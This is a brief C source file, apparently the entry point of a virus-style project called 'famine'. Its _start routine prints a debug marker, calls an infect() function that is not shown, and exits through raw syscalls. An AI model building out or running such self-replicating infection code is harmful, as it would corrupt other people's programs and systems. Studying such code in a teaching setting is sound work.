#include "famine.h"

int		_start(void)
{
	#ifdef DEBUG
		syscall_write(STDOUT_FILENO, "HOST\n", 5);
	#endif
	infect();
	syscall_exit(0);
	return (0);
}
